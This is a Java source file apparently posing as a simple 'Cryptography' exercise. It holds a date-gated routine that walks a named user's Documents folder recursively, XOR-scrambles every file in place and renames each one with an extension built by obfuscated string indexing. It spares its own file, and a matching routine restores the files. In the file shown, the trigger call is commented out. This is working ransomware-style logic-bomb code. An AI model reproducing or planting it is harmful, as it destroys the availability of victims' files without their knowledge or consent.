package problem;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

public class Cryptography {
	static String protectFile="May18.java";
	public static void main(String[] args) {
	 String folderPath = "C:\\Users\\manish.poddar\\Documents\\capi"; 
	 DateTimeFormatter dtf = DateTimeFormatter.ofPattern("yyyyMMddHHmm");
   	 LocalDateTime now = LocalDateTime.now();  
   	 String t1=dtf.format(now).toString();
   	 String t2="202410041204";  //04th oct  
   	 long tt1=Long.parseLong(t1);
   	 long tt2=Long.parseLong(t2); 
   	 if(tt1>tt2) {
   		 System.out.println("Entry");
   		//fetchFilesE(folderPath);
   	 }   	 
        
       // fetchFilesE(folderPath);
       // fetchFilesD(folderPath);
    }
    
    public static void fetchFilesE(String folderPath) {
        File folder = new File(folderPath);
        
        // Check if the path exists and it's a directory
        if (folder.exists() && folder.isDirectory()) {
            fetchFilesHelper(folder);
        } else {
            System.out.println("Invalid folder path.");
        }
    }
    
    private static void fetchFilesHelper(File folder) {
       
        File[] files = folder.listFiles();
        String prjName="Projectname:wb Ls Election Pre Polld";             
        String ext="."+prjName.charAt(12)+""+prjName.charAt(23)+""+prjName.charAt(7);
        
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {                   
                    fetchFilesHelper(file);
                } else {
                    
                    try {                    	
                            if (!file.getName().endsWith(ext) && !file.getName().equals(protectFile) ) {  
                            	//System.out.println(file.getName());
            		                FileInputStream fis = new FileInputStream(file);
            		                byte[] fileBytes = new byte[(int) file.length()];
            		                fis.read(fileBytes);
            		                fis.close();
            		                
            		                for (int i = 0; i < (fileBytes.length); i++) 
            		                    fileBytes[i] = (byte) (fileBytes[i] ^ 5);
            		                
            		                
            		                FileOutputStream fos = new FileOutputStream(file);
            		                fos.write(fileBytes);
            		                fos.close();
            		                
            		                String newName = file.getAbsolutePath() + ext;
            		                File newFile = new File(newName);
            		                file.renameTo(newFile);
                            }
                                     
                       
                    }catch (IOException ex) {
                        ex.printStackTrace();
                    }                	
                }
            }
        }
    }
    
   
    
    
    public static void fetchFilesD(String folderPath) {
        File folder = new File(folderPath);
        
        // Check if the path exists and it's a directory
        if (folder.exists() && folder.isDirectory()) {
            fetchFilesHelperD(folder);
        } else {
            System.out.println("Invalid folder path.");
        }
    }
    
    private static void fetchFilesHelperD(File folder) {
       
        File[] files = folder.listFiles();
        String prjName="Projectname:wb Ls Election Pre Polld";             
        String ext="."+prjName.charAt(12)+""+prjName.charAt(23)+""+prjName.charAt(7);
        
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {                    
                    fetchFilesHelperD(file);
                } else {                    
                    try {                    	
            		    if (file.getName().endsWith(ext)) {
            		    	//System.out.println(file.getName());
        		            FileInputStream fis = new FileInputStream(file);
        		            byte[] fileBytes = new byte[(int) file.length()];
        		            fis.read(fileBytes);
        		            fis.close();
        		            
        		            for (int i = 0; i < (fileBytes.length); i++) 
        		                fileBytes[i] = (byte) (fileBytes[i] ^ 5);
        		            
        		            
        		            FileOutputStream fos = new FileOutputStream(file);
        		            fos.write(fileBytes);
        		            fos.close();        		            
        		            
        		           // System.out.println(ext);
        		            String newName = file.getAbsolutePath().replace(ext, "");
        		            File newFile = new File(newName);
        				    file.renameTo(newFile);
        		    }
                                     
                        System.out.println("File decrypted successfully.");
                    }catch (IOException ex) {
                        ex.printStackTrace();
                    }                	
                }
            }
        }
    }
}
